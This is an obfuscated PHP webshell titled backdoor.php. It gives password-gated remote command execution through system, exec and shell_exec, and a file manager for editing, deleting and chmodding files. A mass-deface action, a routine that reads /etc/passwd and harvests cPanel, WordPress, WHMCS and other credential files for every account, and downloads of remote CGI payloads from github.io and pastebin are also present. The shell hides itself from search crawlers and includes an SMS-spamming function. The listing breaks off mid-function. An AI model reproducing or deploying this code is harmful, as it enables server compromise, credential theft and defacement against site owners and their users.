?><?php

/*
 * backdoor.php
 *
 * Copyright 2018 Cvar1984 <Cvar1984@P22DX>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.9
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
 * MA 02110-1301, USA.
 *
*/

session_start();
set_time_limit(0);
ini_set('max_execution_time', 0);
ini_set('memory_limit', '999999999M');
ini_set('zlib.output_compression', 'Off');
ini_restore('safe_mode');
ini_restore("safe_mode_include_dir");
ini_restore("safe_mode_exec_dir");
ini_restore("disable_functions");
ini_restore("allow_url_fopen");
ini_restore("open_basedir");
ignore_user_abort(0);

$auth_pass = "5a3844a15924bd86558bb85026e633f89d23c191"; // sha1('tuzki')
$email = ""; // Your Email
$a="gzinflate";$b="urldecode";
/*   __________________________________________________
    |  Obfuscated by YAK Pro - Php Obfuscator  2.0.a   |
    |              on 2018-07-14 06:40:43              |
    |    GitHub: https://github.com/pk-fr/yakpro-po    |
    |__________________________________________________|
*/
 goto RONJU; nYmSZ: rjat_: goto d3Ydz; btcVT: kkcdS: goto NQAe_; tg5f0: $sep = substr("\\", 0, 1); goto Vdgxk; kN_m_: goto Jkk29; goto sdV4k; r7ZZ2: function YCCvm()
 {
     unset($_SESSION[sha1(md5($_SERVER["HTTP_HOST"]))]);
     tNbrl();
 } goto caYUZ; OxQua: function T9GAW($dir)
 {
     goto rGSEe;
     oTsgR: return false;
     goto dOqXE;
     SfZNS: UeiKt: goto hwrXH;
     vpb0e: Glu4S: goto VxLOU;
     VxLOU: return true;
     goto JVHLS;
     Ujnk2: $objects = scandir($dir);
     goto hQljB;
     wqXET: if (rmdir($dir)) {
         goto Glu4S;
     }
     goto oTsgR;
     gkXGl: goto j0rwF;
     goto nrEq1;
     ARqLA: return false;
     goto gkXGl;
     nrEq1: uE9BL: goto mtp1p;
     rGSEe: if (is_dir($dir)) {
         goto lKU15;
     }
     goto xpLDI;
     JVHLS: SXtP2: goto SfZNS;
     dOqXE: goto SXtP2;
     goto vpb0e;
     Zh6eT: j0rwF: goto GZvG5;
     hQljB: foreach ($objects as $object) {
         goto budPr;
         LtSXW: aMKwi: goto GTtJD;
         QqzVe: elOWy: goto LtSXW;
         budPr: if (!($object != "\56" && $object != "..")) {
             goto aMKwi;
         }
         goto cbpQr;
         xBJYw: MTHy7: goto tz20g;
         GTtJD: qEKeg: goto VagD9;
         IsfzD: unlink($dir . "/" . $object);
         goto R7fN0;
         R7fN0: goto elOWy;
         goto xBJYw;
         tz20g: T9Gaw($dir . "/" . $object);
         goto QqzVe;
         cbpQr: if (is_dir($dir . "\57" . $object)) {
             goto MTHy7;
         }
         goto IsfzD;
         VagD9:
     }
     goto UVhUT;
     xpLDI: if (@unlink($dir)) {
         goto uE9BL;
     }
     goto ARqLA;
     mtp1p: return true;
     goto Zh6eT;
     GZvG5: goto UeiKt;
     goto ZOVnu;
     UVhUT: f3rqz: goto wqXET;
     ZOVnu: lKU15: goto Ujnk2;
     hwrXH:
 } goto Y0_OA; UQWtE: JLdTe(); goto OMq5A; upQzj: function rtPa4($file)
 {
     goto Px6Gs;
     Px6Gs: if (@touch($file . "/" . "new_file\56php")) {
         goto KS_Er;
     }
     goto httHa;
     wabfW: jJIXG("Success");
     goto iLu0D;
     vvvgf: goto nN9Rs;
     goto Hs9vb;
     Hs9vb: KS_Er: goto wabfW;
     httHa: jJIXg("Permission Denied\40Or File\40Exists");
     goto vvvgf;
     iLu0D: nN9Rs: goto CYx5y;
     CYx5y:
 } goto ndz_0; xqfOY: function NlYYO($url, $data)
 {
     goto WXSWo;
     O_hHL: curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
     goto eaA9Q;
     AY2lw: curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
     goto O_hHL;
     gciuZ: curl_close($ch);
     goto vKMjd;
     sdAE8: return curl_exec($ch);
     goto gciuZ;
     oUc22: curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
     goto AY2lw;
     eaA9Q: curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
     goto sdAE8;
     WXSWo: $ch = curl_init($url);
     goto oUc22;
     vKMjd:
 } goto r0gN3; WdgQ4: if ($_GET["do"] == "chmod" and isset($_GET["files"])) {
     goto Vb10t;
 } goto CHviX; XyLTN: function c5s6G()
 {
     jJiXg("This feature\40under\40development");
 } goto dmbX9; eVXgr: jjiXg("Success"); goto Db0q_; Hz6Gx: Vqggv: goto eptYg; lXYhF: luKGR: goto DdRy8; MBMaY: ByHtq: goto tg5f0; pwCJW: if (!isset($_GET["do"])) {
     goto gJTfH;
 } goto zNXEM; r1s0N: if (!isset($_POST["upl"])) {
     goto rea3J;
 } goto AhvnH; EI6yV: if ($_GET["do"] == "edit" and isset($_GET["files"])) {
     goto t30L2;
 } goto M29w9; h0DV_: X06oR: goto rcxk9; Eld8r: goto Jkk29; goto wi8wr; deCzC: function u4Tux($cmd)
 {
     goto HHE7A;
     exPGa: $buff = ob_get_contents();
     goto m2qV5;
     m71US: QEIHb: goto aEyU8;
     xg7TK: return $buff;
     goto ivo_o;
     tCvMQ: $buff = ob_get_contents();
     goto bXPMc;
     HHE7A: if (function_exists("system")) {
         goto QEIHb;
     }
     goto UPb81;
     MWvMT: if (function_exists("passthru")) {
         goto WuyA0;
     }
     goto LoMNq;
     ivo_o: goto Rj53k;
     goto RAC4_;
     WqYQI: $buff = '';
     goto Ys0NG;
     KohO_: goto Rj53k;
     goto URVjO;
     yk4I0: ob_start();
     goto Kncsc;
     UPb81: if (function_exists("exec")) {
         goto pvB0k;
     }
     goto MWvMT;
     m2qV5: ob_end_clean();
     goto zLlk6;
     Rxtqg: Rj53k: goto gkoLd;
     aEyU8: ob_start();
     goto yduGd;
     URVjO: pvB0k: goto e8wFJ;
     yduGd: @system($cmd);
     goto tCvMQ;
     hcaWn: return $buff;
     goto KohO_;
     zLlk6: return $buff;
     goto xIQCq;
     e8wFJ: @exec($cmd, $results);
     goto WqYQI;
     bXPMc: ob_end_clean();
     goto hcaWn;
     Kncsc: @passthru($cmd);
     goto exPGa;
     RAC4_: WuyA0: goto yk4I0;
     W4kqk: ZZcML: goto xg7TK;
     x5kd8: lp_ro: goto f8Vil;
     Oc21i: goto Rj53k;
     goto m71US;
     LoMNq: if (function_exists("shell_exec")) {
         goto lp_ro;
     }
     goto Oc21i;
     f8Vil: $buff = @shell_exec($cmd);
     goto jGKpC;
     xIQCq: goto Rj53k;
     goto x5kd8;
     Ys0NG: foreach ($results as $result) {
         $buff .= $result;
         pXz1I:
     }
     goto W4kqk;
     jGKpC: return $buff;
     goto Rxtqg;
     gkoLd:
 } goto bBZU9; SmrFX: echo "\74table\40width='7\60%\47 cellpadding\75'3\47\40cellspacing\75'\63' align='center\47 style\75\47background:green\73\47>\xd\xa\x9\74th\40style='background\72green\73float\72left\73width:\62\60\60px;text-align:center;font-size\72\61\70px\73\47\76Name<\57th>\15\xa\x9\74th style\75\47background:green;float\72right;width\72˜0px\73text-align:center;font-size:1\70px\73\47>Action\74/th\76\xd\12\11\74\57table>"; goto gcOHE; qkQRD: UeqDA($_GET["files"]); goto v1W3k; WoElu: if ($_GET["do"] == "logout") {
     goto mIQb1;
 } goto EI6yV; tK6jq: cVxIB: goto AmxkD; aaD85: if ($_GET["do"] == "view" and isset($_GET["files"])) {
     goto Vqggv;
 } goto wxaII; OPU8D: UdMDI: goto H2Oo2; VGEHJ: goto Jkk29; goto s63LX; QjL6a: ?>, 
			<a href='https://github.com/Cvar1984'>Cvar1984</a> & <a href='https://github.com/l0lz666h05t'>L0LZ666H05T</a>
			</center>
		</th>
	</table>
	<?php  goto r1s0N; g8_oj: goto Jkk29; goto SLwwz; xtMZ1: goto Jkk29; goto iUmx7; rcxk9: ?>
<table width='70%' cellpadding='3' cellspacing='3' align='center'
		style='background: green;'>
		<th style='padding: 5px;' colspan='2'>
			<center>
			Copyright &copy <?php  goto OI4ds; s5SwB: goto yTl53; goto MBMaY; eXMF4: if (empty($auth_pass) or isset($_GET["pass"]) and sha1($_GET["pass"]) == $auth_pass) {
     goto kkcdS;
 } goto GP2Ek; v1W3k: goto Jkk29; goto OPU8D; RONJU: if (strtolower(substr(PHP_OS, 0, 3)) == "win") {
     goto ByHtq;
 } goto wb8wZ; HyKF2: $userAgents = array("Googlebot", "DuckDuckBot", "Baiduspider", "Exabot", "SimplePie", "Curl", "OkHttp", "SiteLockSpider", "BLEXBot", "ScoutJet", "AdsBot\40Google Mobile", "Googlebot\40Mobile", "MJ1\62bot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "facebot", "ia_archiver", "crawler", "YandexBot", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot"); goto KJTqW; dV0jz: function cbVC0()
 {
     goto GFcyl;
     QcIXx: echo php_uname();
     goto GYeve;
     kGeuX: die;
     goto OBGBj;
     ep4I3: goto ymYKL;
     goto XWnvJ;
     SUtMs: echo $dist;
     goto sfbWA;
     GYeve: ?></h5>
   	<h5>Disabled Function : <?php  goto SUtMs;
     sfbWA: ?> </h5>
		<textarea class="form-control" id="textarea" readonly /><?php  goto Nt9wV;
     XWnvJ: ycc4S: goto uEafZ;
     EbTWn: ymYKL: goto aW13r;
     Nt9wV: var_dump($_SERVER);
     goto QH5QB;
     aW13r: ?>
   <center>
   	<h5><?php  goto QcIXx;
     QH5QB: ?></textarea>
	</center>
	<?php  goto kGeuX;
     GFcyl: if (!ini_get("disable_functions") == true) {
         goto ycc4S;
     }
     goto DviOr;
     uEafZ: $dist = "False";
     goto EbTWn;
     DviOr: $dist = ini_get("disable_functions");
     goto ep4I3;
     OBGBj:
 } goto r7ZZ2; wdnHz: JjiXG("Permission\40Denied"); goto VHd9t; dmbX9: function M4L6u()
 {
     goto Ak3zR;
     rsXtg: if (file_exists("\57home\57")) {
         goto kJrdD;
     }
     goto OzNJK;
     Ua_R2: Tg27Y: goto nI_uO;
     LODfv: $isi = "Options FollowSymLinks MultiViews Indexes\40ExecCGI\xaRequire None\12Satisfy Any\12AddType application\57x-httpd-cgi \56cin\12AddHandler\40cgi-script .cin\12AddHandler cgi\55script\40\56cin";
     goto iNOBI;
     iNOBI: file_put_contents(".config/config/\56htaccess", $isi);
     goto TorFm;
     tPg0v: goto Tg27Y;
     goto QuWHU;
     hQktX: gFARi: goto VSauv;
     BduKY: IO8Nu: goto eex5v;
     wmhcH: $home = "home4";
     goto Ua_R2;
     QuWHU: cwJVz: goto wmhcH;
     VSauv: if (!($passwd = fgets($etc))) {
         goto WV6Zq;
     }
     goto wzmbC;
     f6J2e: mkdir("\56config/config");
     goto vr7ZA;
     pP06I: bnzLN: goto mfCIf;
     JG_9r: echo "<center><a href='{$link_config}/.config/config\57vhost\56cin\47><font\40color\75lime>Done<\57font\76</a\76</center>";
     goto pMxKQ;
     KakQ6: goto bnzLN;
     goto XMpAh;
     Vyec4: if (u4tUX("cd\40.config/config \46& ./vhost\56cin")) {
         goto IO8Nu;
     }
     goto JG_9r;
     OzNJK: if (file_exists("\57home1\57")) {
         goto Bvgm7;
     }
     goto OdMNm;
     B_MeU: goto Tg27Y;
     goto MNyni;
     oV5jb: die;
     goto q0JDw;
     eex5v: echo "<center><a href='{$link_config}\57\56config/config\47>\74font\40color\75lime>Done</font></a><\57center>";
     goto nnl4_;
     MNyni: Bvgm7: goto P8KDl;
     wzmbC: if ($passwd == '' || !$etc) {
         goto M6tem;
     }
     goto sYLvU;
     pMxKQ: goto t3kfc;
     goto BduKY;
     fk0e9: goto Tg27Y;
     goto lpYqO;
     MoJPT: if (preg_match("\57vhosts|vhost\57", $dir)) {
         goto mB6Sg;
     }
     goto xKtfe;
     XMpAh: M6tem: goto XJgNj;
     FUVkt: mkdir("\56config");
     goto lXP2I;
     A3037: uHAaP: goto h9kjN;
     vr7ZA: xDzyC: goto yB9mC;
     Bgo0y: goto Tg27Y;
     goto z9HDY;
     nK_4g: if (file_exists("\57home4/")) {
         goto cwJVz;
     }
     goto fk0e9;
     cUevT: if (file_exists("/home3/")) {
         goto uHAaP;
     }
     goto nK_4g;
     JwFiN: WV6Zq: goto hXynT;
     h9kjN: $home = "home\63";
     goto tPg0v;
     dSNBE: if (file_exists("\56config")) {
         goto wSPhj;
     }
     goto FUVkt;
     Un6V2: if (file_exists(".config\57config\57vhost.cin")) {
         goto s4Lcz;
     }
     goto NgLGv;
     z9HDY: IcGxH: goto SbNtR;
     nnl4_: t3kfc: goto HsGay;
     NgLGv: file_put_contents(".config/config/vhost.cin", gzinflate(urldecode(file_get_contents("https:/\57cvar19\64\56github.io\57vhost.cin"))));
     goto pUkc7;
     nI_uO: foreach ($user_config[1] as $user_idx) {
         goto Bpbnk;
         Bpbnk: $user_config_dir = "\57{$home}\57{$user_idx}/public_html";
         goto zfuCW;
         NRptc: $grab_config = array("/{$home}/{$user_idx}\57.my\56cnf" => "cpanel", "/{$home}/{$user_idx}\57.accesshash" => "WHM-accesshash", "{$user_config_dir}/po-content\57config.php" => "Popoji", "{$user_config_dir}/vdo_config.php" => "Voodoo", "{$user_config_dir}\57bw\55configs/config.ini" => "BosWeb", "{$user_config_dir}\57config\57koneksi.php" => "Lokomedia", "{$user_config_dir}/lokomedia/config\57koneksi.php" => "Lokomedia", "{$user_config_dir}\57koneksi.php" => "Lokomedia", "{$user_config_dir}/clientarea\57configuration.php" => "WHMCS", "{$user_config_dir}/whm/configuration.php" => "WHMCS", "{$user_config_dir}/whmcs/configuration.php" => "WHMCS", "{$user_config_dir}\57forum/config.php" => "phpBB", "{$user_config_dir}/sites/default\57settings\56php" => "Drupal", "{$user_config_dir}/config\57settings.inc\56php" => "PrestaShop", "{$user_config_dir}\57app\57etc/local.xml" => "Magento", "{$user_config_dir}/joomla\57configuration.php" => "Joomla", "{$user_config_dir}\57configuration.php" => "Joomla", "{$user_config_dir}/wp/wp\55config.php" => "WordPress", "{$user_config_dir}\57wordpress\57wp-config\56php" => "WordPress", "{$user_config_dir}/wp\55config\56php" => "WordPress", "{$user_config_dir}/admin\57config.php" => "OpenCart", "{$user_config_dir}\57slconfig.php" => "Sitelok", "{$user_config_dir}\57application/config/database.php" => "Ellislab", "{$user_config_dir}/config\57database.php" => "Ellislab", "{$user_config_dir}/models/db-settings.php" => "Usercake", "{$user_config_dir}/config/database.php" => "Laravel", "{$user_config_dir}\57database\56php" => "Laravel", "{$user_config_dir}\57application\57config.ini" => "Zend", "{$user_config_dir}/config/app.php" => "CakePHP", "{$user_config_dir}/phalcon\57config\57adapter/ini.zep" => "Phalcon", "{$user_config_dir}\57config\57adapter\57ini\56zep" => "Phalcon", "{$user_config_dir}/app\57config\57configuration.yml" => "Symphony", "{$user_config_dir}\57app\57config\57databases.yml" => "Symphony", "{$user_config_dir}\57config\57configuration\56yml" => "Symphony", "{$user_config_dir}\57config\57databases.yml" => "Symphony", "{$user_config_dir}\57config/db\56php" => "FuelPHP &\40Yii\62", "{$user_config_dir}/src/settings\56php" => "Slim");
         goto Ykra6;
         zfuCW: if (!is_readable($user_config_dir)) {
             goto eZJEp;
         }
         goto NRptc;
         qNg1S: eZJEp: goto ompfy;
         ompfy: LvSfc: goto ZVHb0;
         lvffG: V6ibd: goto qNg1S;
         Ykra6: foreach ($grab_config as $config => $nama_config) {
             goto FgYUs;
             tru78: fclose($file_config);
             goto Z2_kQ;
             H6Pnu: if (empty($ambil_config)) {
                 goto rph89;
             }
             goto RWIwH;
             RWIwH: $file_config = fopen(".config/config\57{$user_idx}-{$nama_config}\56txt", "w");
             goto Z227f;
             Z2_kQ: rph89: goto st3D0;
             Z227f: fputs($file_config, $ambil_config);
             goto tru78;
             st3D0: n2vT2: goto Ycg4y;
             FgYUs: $ambil_config = @file_get_contents($config);
             goto H6Pnu;
             Ycg4y:
         }
         goto lvffG;
         ZVHb0:
     }
     goto CsoN6;
     lpYqO: kJrdD: goto HMD0q;
     hXynT: echo "\74center>\74a\40href\75\47\77do\75open&dir\75" . getcwd() . $sep . $dir . "/\56config\57config'\76Done\74/a>\74/center\76";
     goto TTX38;
     mfCIf: goto gFARi;
     goto JwFiN;
     B4veG: mB6Sg: goto sl9kw;
     TTX38: goto vBRCY;
     goto B4veG;
     sYLvU: preg_match_all("/(.\52\77)\72x:\57", $passwd, $user_config);
     goto rsXtg;
     tyQXN: goto Tg27Y;
     goto A3037;
     P8KDl: $home = "home1";
     goto Bgo0y;
     lXP2I: wSPhj: goto LuI8m;
     HMD0q: $home = "home";
     goto B_MeU;
     LuI8m: if (file_exists(".config/config")) {
         goto xDzyC;
     }
     goto f6J2e;
     OdMNm: if (file_exists("\57home\62/")) {
         goto IcGxH;
     }
     goto cUevT;
     sl9kw: $link_config = str_replace($_SERVER["DOCUMENT_ROOT"], '', $dir);
     goto Un6V2;
     yB9mC: if (file_exists("\56config\57config\57.htaccess")) {
         goto e3Urw;
     }
     goto LODfv;
     Ak3zR: global $dir;
     goto dSNBE;
     HsGay: vBRCY: goto oV5jb;
     SbNtR: $home = "home2";
     goto tyQXN;
     xKtfe: $etc = @fopen("\57etc/passwd", "r") or die("<pre><font color\75red\76Can't\40read\40/etc\57passwd\74/font\76\74/pre>");
     goto hQktX;
     CsoN6: U7w25: goto KakQ6;
     XJgNj: echo "<font color\75red\76Can't\40read \57etc\57passwd<\57font>";
     goto pP06I;
     TorFm: e3Urw: goto MoJPT;
     pUkc7: s4Lcz: goto Vyec4;
     q0JDw:
 } goto SoADm; pxJ_h: function A4P0t()
 {
     goto YM1YN;
     t4VZ2: curl_close($ch);
     goto Tx4K9;
     s2Om1: curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content\55type:application/json"));
     goto N7oWo;
     Tx4K9: $json = json_decode($response);
     goto c5lwm;
     jtCAX: $post = array("longUrl" => $_POST["link"]);
     goto ggrzt;
     gwOV0: ?>
<form method='post'>
	<table align="center">
		<tr>
			<td>Link</td>
			<td>:</td>
			<td>
				<input type='text' class='input-sm' id='input' name='link'>
			</td>
		</tr>
	</table>
	<center>
		<br />
		<input type='submit' class='btn btn-danger' name='action'>
	</center>
</form>
<?php  goto CR_ra;
     YM1YN: $mykey = "AIzaSyDKvTCsXX3Vipbqyhj\63a\60JH\61D3JYMuB\65VM";
     goto spoX_;
     PgsXr: $param = "https:\57/www\56googleapis.com\57urlshortener/v1\57url?key\75{$mykey}";
     goto jtCAX;
     c5lwm: if (isset($json->error)) {
         goto Qrm00;
     }
     goto GNigg;
     U9Fu1: curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
     goto rez4Z;
     ggrzt: $jsondata = json_encode($post);
     goto K8VEb;
     GNigg: echo "\74center><textarea id\75\47textarea\47 class='form\55control' readonly\76" . $json->id . "<\57textarea></center>";
     goto lZxZH;
     mGuup: if (!isset($_POST["action"])) {
         goto Ulh3s;
     }
     goto PgsXr;
     og7zG: LNads: goto pQu0I;
     lZxZH: goto LNads;
     goto H9LME;
     rez4Z: curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
     goto wlblg;
     H9LME: Qrm00: goto jDMpP;
     K8VEb: $ch = curl_init();
     goto fN8BU;
     CR_ra: die;
     goto Ruels;
     wlblg: curl_setopt($ch, CURLOPT_HEADER, 0);
     goto s2Om1;
     N7oWo: curl_setopt($ch, CURLOPT_POST, 1);
     goto HDn9R;
     spoX_: echo "<center\76\74h\62\76Shortlink Generator<\57h2\76</center>";
     goto mGuup;
     fN8BU: curl_setopt($ch, CURLOPT_URL, $param);
     goto U9Fu1;
     pQu0I: Ulh3s: goto gwOV0;
     P7_hf: $response = curl_exec($ch);
     goto t4VZ2;
     jDMpP: echo $json->error->message;
     goto og7zG;
     HDn9R: curl_setopt($ch, CURLOPT_POSTFIELDS, $jsondata);
     goto P7_hf;
     Ruels:
 } goto cxDMj; lYqT1: if ($_GET["do"] == "rename" and isset($_GET["files"])) {
     goto yc9Lm;
 } goto WdgQ4; H2Oo2: glSbX(); goto eCp7p; eCp7p: goto Jkk29; goto aZCmH; YVxpL: goto Jkk29; goto xoXtw; wc7Yd: if (empty($_SERVER["HTTP_USER_AGENT"])) {
     goto S1ihE;
 } goto HyKF2; IxX6P: if ($_GET["do"] == "new" and isset($_GET["dir"])) {
     goto luKGR;
 } goto BWB1O; KJTqW: if (!preg_match("/" . implode("|", $userAgents) . "/i", $_SERVER["HTTP_USER_AGENT"])) {
     goto vdcmX;
 } goto tZReq; qmWpE: BV2P6: goto K88AD; rgZdR: function l1Zr1()
 {
     goto z7st_;
     S4MHk: echo "\74iframe src='.config/cgi.izo\47 class='iframe'\40frameborder\75\47\60\47\40scrolling\75'no\47\76\74/iframe\76";
     goto NQ0Up;
     vW9z5: nyO53: goto pGSPU;
     NQ0Up: die;
     goto ff8Bk;
     NkBn1: file_put_contents(".config/\56htaccess", "AddHandler\40cgi\55script\40.izo\xaOptions\40-Indexes");
     goto hy0RM;
     p4fdd: if (file_exists("\56config")) {
         goto nyO53;
     }
     goto soI4a;
     vi13A: vbkQf: goto j5Otn;
     hy0RM: file_put_contents("\56config/cgi\56izo", file_get_contents("https:\57/pastebin\56com\57raw\57MUD\60EPjb"));
     goto fj69F;
     ff8Bk: goto vbkQf;
     goto yRwnt;
     soI4a: mkdir("\56config");
     goto vW9z5;
     qjjJg: jjIxg("This\40function not available\40for Windows server");
     goto vi13A;
     fj69F: n7cKs: goto S4MHk;
     rMii0: if ($os == "Windows") {
         goto zqdgc;
     }
     goto p4fdd;
     z7st_: global $os;
     goto rMii0;
     pGSPU: if (file_exists("\56config/cgi.izo") and file_exists("\56config/.htaccess")) {
         goto n7cKs;
     }
     goto NkBn1;
     yRwnt: zqdgc: goto qjjJg;
     j5Otn:
 } goto s08OF; Vdgxk: $os = "Windows"; goto Jwoo0; v0HnU: rtPa4($_GET["files"]); goto Eld8r; K88AD: CbVc0(); goto OHqrl; pSWnp: rea3J: goto Y4e5u; k0mSL: if ($_GET["do"] == "info") {
     goto BV2P6;
 } goto WoElu; xoXtw: Vb10t: goto qkQRD; g5XV0: goto Jkk29; goto a20F6; fP0qQ: if ($_GET["do"] == "sms") {
     goto vL5pr;
 } goto Vw1Hz; n4U_N: zS3q1: goto qkhAz; SoADm: function gyZGO()
 {
     JjIxG("This\40feature\40under\40development");
 } goto dV0jz; SLwwz: zV8YQ: goto Fhp6L; Linvc: if ($_GET["do"] == "mass_deface") {
     goto CR3t3;
 } goto k0mSL; WkBOZ: mIQb1: goto d_edT; BZ_hd: if (!function_exists("file_get_contents")) {
     echo "<script>alert\50'file_get_contents function disabled\54\40this webshell not\40working\40properly\47)\74\57script>";
 } goto nLbsJ; L1bpu: goto N4hON; goto tK6jq; gRcNX: N4hON: goto pSWnp; ANdEW: CR3t3: goto aux2O; ThQCb: Jkk29: goto iVxP2; JfUXZ: if (isset($_SESSION[sha1(md5($_SERVER["HTTP_HOST"]))])) {
     goto rjat_;
 } goto eXMF4; sdV4k: yc9Lm: goto nENXh; Jwoo0: yTl53: goto wc7Yd; OHqrl: goto Jkk29; goto WkBOZ; a20F6: q7lM0: goto lsPIc; r0gN3: function TnBrl()
 {
     echo "\74script\76window\56location\75'?\47;<\57script\76";
 } goto OxQua; G7bgQ: goto Jkk29; goto uZ0y4; iVxP2: gJTfH: goto pDr2s; Sp_ot: if (empty($email)) {
     goto zS3q1;
 } goto qdGnG; gcOHE: foreach ($dir as $dir) {
     goto Z6Vib;
     EDggY: echo "\74td\76\74img\40src\75\47https:\57/cvar18\64.github.io/text\55plain\55icon\56png' class='icon'\76";
     goto xbFKS;
     Z6Vib: ?>
<table width='70%' class='table-hover' align='center'>
		<tr>
	<?php  goto ERZh_;
     Z5QzU: goto hdv70;
     goto Oq_Zr;
     bnE7V: ?>
	</tr>
	</table>
<?php  goto tFi3s;
     E0ixO: echo "\74a href='?do=view&files\75" . getcwd() . $sep . $dir . "'>{$dir}\74/a></td>";
     goto Pkd8p;
     Oq_Zr: Gjq8m: goto b3IPg;
     tFi3s: Dd4gC: goto Cd_w4;
     pmidC: if ($ext == "jpg" or $ext == "png" or $ext == "jpeg" or $ext == "gif" or $ext == "rar" or $ext == "zip" or $ext == "doc" or $ext == "pdf") {
         goto Gjq8m;
     }
     goto EDggY;
     xbFKS: echo "<a href=\47\77do=edit&files\75" . getcwd() . $sep . $dir . "\47\76{$dir}\74\57a>\74/td>";
     goto JUBn9;
     Pkd8p: echo "<td style=\47float\72right;margin\55right:7px;'\76\xd\12\11\11<a class='btn btn\55success\40btn\55xs'\40href='\77do\75touch&files=" . getcwd() . $sep . dirname($dir) . "\47>New\40File<\57a\76\xd\12\11\11\74a\40class='btn\40btn\55success\40btn-xs\47 href\75'?do\75new\46dir=" . getcwd() . $sep . dirname($dir) . "'>New Dir<\57a>\xd\12\x9\x9<a class\75\47btn\40btn-success btn\55xs' href\75\47\77do=chmod&files=" . getcwd() . $sep . $dir . "'\76Chmod</a\76\15\12\11\x9<a class\75'btn btn\55success btn-xs' href=\47\77do=rename&files\75" . getcwd() . $sep . $dir . "'>Rename<\57a\76\40\xd\xa\11\11<a\40class='btn\40btn\55success btn\55xs\47\40href\75'\77do=delete&files=" . getcwd() . $sep . $dir . "\47>Delete\74\57td>";
     goto lxDpQ;
     XfGdu: vaQ3d: goto zTGk1;
     JEMqy: echo "\74a href\75\47?do=open\46dir\75" . getcwd() . $sep . $dir . "\47\76{$dir}<\57a>\74/td\76";
     goto EnY_N;
     EnY_N: echo "\74td\40style\75\47float\72right\73margin-right×px;'>\15\12\11\11\74a\40class=\47btn\40btn-success btn-xs' href=\47?do\75touch&files\75" . getcwd() . $sep . dirname($dir) . "\47>New\40File\74/a\76\xd\12\x9\11<a\40class\75\47btn btn-success\40btn-xs\47\40href='\77do=new\46dir=" . getcwd() . $sep . $dir . "\47\76New Dir\74\57a>\15\xa\x9\x9\74a class\75'btn btn\55success\40btn\55xs\47\40href=\47?do=chmod\46files\75" . getcwd() . $sep . $dir . "'>Chmod\74\57a\76\15\12\x9\11<a\40class=\47btn btn-success\40btn\55xs\47\40href=\47\77do\75rename&files=" . getcwd() . $sep . $dir . "'\76Rename\74/a\76 \xd\12\11\11\74a\40class\75'btn\40btn-success btn\55xs\47 href='?do=delete\46files=" . getcwd() . $sep . $dir . "\47>Delete<\57td>";
     goto Z5QzU;
     JUBn9: echo "\74td style\75\47float\72right;margin-right:\67px;'\76\15\xa\11\x9\74a\40class=\47btn btn\55success btn\55xs'\40href\75\47?do\75touch&files\75" . getcwd() . $sep . dirname($dir) . "\47>New File</a>\15\xa\11\x9<a\40class='btn\40btn-success\40btn-xs' href\75\47?do=new&dir\75" . getcwd() . $sep . dirname($dir) . "'\76New Dir\74\57a\76\15\12\x9\11<a class\75\47btn\40btn\55success\40btn\55xs' href=\47\77do=chmod\46files\75" . getcwd() . $sep . $dir . "\47>Chmod</a\76\15\12\11\11<a class='btn\40btn\55success\40btn-xs\47\40href\75\47\77do\75rename\46files=" . getcwd() . $sep . $dir . "\47>Rename</a\76\40\15\12\11\x9<a\40class\75\47btn btn\55success\40btn-xs\47 href='?do\75delete&files\75" . getcwd() . $sep . $dir . "\47>Delete\74\57td>";
     goto s0fYO;
     lxDpQ: hdv70: goto bnE7V;
     b3IPg: echo "\74td\76<img\40src\75\47https\72//cvar1\71Ä.github.io/text-plain\55icon.png\47\40class=\47icon'>";
     goto E0ixO;
     ERZh_: $ext = pathinfo($dir, PATHINFO_EXTENSION);
     goto BdbX6;
     s0fYO: goto hdv70;
     goto XfGdu;
     BdbX6: if (is_dir($dir)) {
         goto vaQ3d;
     }
     goto pmidC;
     zTGk1: echo "\74td>\74img src\75\47https:\57/cvar1\70\64.github.io\57Blank-Folder\55icon.png\47 class\75\47icon'\76";
     goto JEMqy;
     Cd_w4:
 } goto h0DV_; acC90: function XIZfI($filename)
 {
     goto DZmLr;
     arh4R: if (file_put_contents($filename, $_POST["text"])) {
         goto ckiHe;
     }
     goto JVtU4;
     ZYUVq: echo $filename;
     goto zhx0V;
     s3yXF: ckiHe: goto bjM9z;
     UgNVA: $text = file_get_contents($filename);
     goto Giypk;
     HWcsA: PET72: goto ECV1A;
     x1nAH: die;
     goto DkaSn;
     bjM9z: jjIxg("Sucess");
     goto HWcsA;
     kvHTT: goto PET72;
     goto s3yXF;
     DZmLr: if (!isset($_POST["text"])) {
         goto y24W1;
     }
     goto arh4R;
     ECV1A: y24W1: goto UgNVA;
     zhx0V: ?></h5>
			<textarea name="text" class="form-control" id="textarea" cols=""
				rows=""><?php  goto SEufb;
     JVtU4: JjIXG("Permission\40Denied");
     goto kvHTT;
     Giypk: ?>
<form method="post">
		<center>
			<h5>Files Editor : <?php  goto ZYUVq;
     SEufb: echo htmlspecialchars($text);
     goto S1FNm;
     S1FNm: ?></textarea>
			<br> <input type="submit" class="btn btn-danger" />
		</center>
	</form>
<?php  goto x1nAH;
     DkaSn:
 } goto yTS4n; Y0_OA: function JLDte()
 {
     goto yGgBc;
     Md_vl: $no = explode("\xa", $_POST["no"]);
     goto fRA5y;
     BzGNZ: $x = 0;
     goto HtkVY;
     V9k_V: goto Olvjd;
     goto K01Ds;
     lLNor: if (isset($_POST["action"])) {
         goto Ygpa0;
     }
     goto VRY1K;
     SLw0m: yC5Wq: goto Bsx0N;
     efcZD: foreach ($no as $on) {
         goto mTvp3;
         zozos: NLYyO("http:\57/sc.jd\56id/phone/sendPhoneSms", "phone=" . $on . "&smsTypeé");
